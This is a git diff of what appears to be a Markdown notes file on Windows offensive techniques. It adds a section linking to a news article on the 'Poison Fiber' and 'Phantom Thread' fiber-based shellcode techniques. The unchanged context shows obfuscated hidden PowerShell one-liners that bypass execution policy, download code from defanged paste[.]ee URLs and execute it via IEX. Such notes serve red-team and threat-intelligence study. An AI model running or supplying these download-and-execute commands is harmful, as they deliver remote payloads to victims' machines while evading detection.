@@ -13,6 +13,7 @@
     - DLL Hijacking
 - Windows Defender
 - Powershell downloading / running
+- New Fibers techniques 
 
 ## Tooling
 
@@ -297,3 +298,8 @@ powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring
 powershell.exe  -w h -ExecutionPolicy Bypass -Command "(I'w'r('hxxps://paste[.]ee/r/mzeOz/0') -useB) | .('{1}{$}'.replace('$','0')-f'!','I').replace('!','ex');"
 powershell.exe  -w h -ExecutionPolicy Bypass -Command "(I'w'r('hxxps://paste[.]ee/r/pxLkv/0') -useB) | .('{1}{jaHxp}'.replace('jaHxp','0')-f'!','I').replace('!','ex');"
 ```
+
+## New fibers techniques
+
+Two new code-execution techniques, Poison Fiber and Phantom Thread, take advantage of a little-known Windows OS workhorse to sneak shellcode and other malware onto victim machines. [Link](https://www.darkreading.com/application-security/sneaky-shellcode-windows-fibers-edr-proof-code-execution).
+
